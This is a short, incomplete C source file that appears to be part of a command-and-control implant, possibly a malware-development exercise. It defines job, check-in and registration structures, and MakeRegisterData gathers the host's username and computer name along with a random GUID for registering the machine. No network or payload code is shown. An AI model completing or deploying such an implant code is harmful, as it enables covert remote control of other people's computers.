#include "command.h"
// used for parsing out commands




// Get the size of the struct sans null byte
size_t GetSizeRequest(JobRequest *jr){
    return sizeof(JobRequest) + strlen(jr->szArgs);

}


size_t GetSizeResponse(JobResponse *jr){
  return sizeof(JobResponse) + jr->llOut;
}

size_t GetCheckinSize(CheckinData *chckin){
    return GetSizeResponse( (chckin->jobResponse)) + sizeof(chckin->Guid);
}


size_t GetRegisterSize(RegisterData *rd){
    return sizeof(RegisterData) ;
}


// Hints 
// GetUserNameA
// GetComputerNameA
// RtlGenRandom
BOOL MakeRegisterData(RegisterData *rd){
    DWORD dwSize = 0;
    ZeroMemory(rd, GetRegisterSize(rd));
    dwSize = (DWORD)sizeof(rd->szUsername);

    if (!GetUserNameA(rd->szUsername, &dwSize)){
        return FALSE;
    }
        dwSize = (DWORD)sizeof(rd->szHostname);

    if(!GetComputerNameA(rd->szHostname, &dwSize)){
        return FALSE;
    }
    if(!RtlGenRandom(rd->Guid, sizeof(rd->Guid))){
        return FALSE;
    }


    // todo

    return TRUE;
}